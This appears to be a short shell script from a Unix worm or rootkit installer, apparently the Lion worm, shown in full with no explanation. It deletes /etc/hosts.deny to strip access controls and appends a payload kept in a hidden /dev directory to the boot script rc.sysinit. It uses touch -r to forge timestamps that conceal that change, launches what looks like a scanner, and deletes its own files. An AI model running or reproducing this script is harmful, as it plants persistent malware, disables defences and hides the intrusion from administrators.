#!/bin/sh

rm -f /etc/hosts.deny
./getip.sh

touch -r /etc/rc.d/rc.sysinit getip.sh
echo "/dev/.lib/lib/scan/star.sh" >> /etc/rc.d/rc.sysinit
touch -r getip.sh /etc/rc.d/rc.sysinit

touch bindname.log
./star.sh

rm -rf getip.sh
rm -rf 1i0n.sh
